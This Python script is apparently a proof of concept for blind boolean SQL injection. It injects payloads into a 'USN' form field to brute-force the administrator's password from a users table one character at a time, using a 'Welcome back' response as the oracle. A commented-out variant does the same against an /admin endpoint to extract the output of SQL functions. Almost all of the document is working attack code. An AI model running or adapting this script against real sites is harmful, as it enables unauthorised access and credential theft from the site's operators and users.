import requests, sys
url = input('Enter URL: ')
#len = input('Enter Length Password: ')
query = sys.argv[1]
s= ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
    'W', 'X', 'Y', 'Z','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 
    's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
]
headers = {
    'Set-Cookie': 'TrackingId=; Secure; HttpOnly, session=; Secure; HttpOnly; SameSite=None',
    'Content-Type': 'text/html; charset=utf-8', 
    'Content-Encoding': 'gzip', 
    'Connection': 'close', 
    'Content-Length': '1646'
}
rs = requests.get(url)
def poc():
    global s, len, url, headers
    result = ''
    for i in range(1, 20):
        for c in s :
            payload= {
            "USN":"' and (select substring (password,%d,1) from users where username='administrator')='%s'-- -"%(i,c)
            }
            r= requests.post(url=url,data=payload,headers=headers)
            if '"be":Welcome back' in r.text:
                print("Found: %s"%c)
                result += c
    return result
print(poc())
# import sys, requests, string, json

# query = sys.argv[1]
# l= 9
# s= ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
#     'W', 'X', 'Y', 'Z','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 
#     's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!','#','$','%','&',
#     '(',')','*','+', '-','.','/',':',';','<','=','>','?','@','[',']','^','_','`'
# ]
# url = 'https:///admin'
# headers = {
#     'Cookie': 'wsg_referrer=; wsg_pages=https:///',
#     'Content-Type': 'application/x-www-form-urlencoded',
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
#     'Accept': '*/*',
#     'Accept-Language': 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
#     'Accept-Encoding': 'gzip, deflate',
#     'Content-Length': '440',
#     'Origin': 'https://',
#     'X-Requested-With': 'XMLHttpRequest',
#     'Connection': 'close',
#     'Referer': 'https:///admin'
# }

# def poc(query=''):
#     global l, s, url, headers
#     result = ''
#     for i in range(1,l+1):
#         for c in s :
#             payload= {
#             "USN":"admin' and (substring (%s(),%d,1))='%s'-- -"%(query,i,c)
#             }
#             r= requests.post(url=url,data=payload,headers=headers)
#             if '"be":true' in r.text:
#                 print("Found: %s"%c)
#                 result += c
#     return result
# print(poc(query))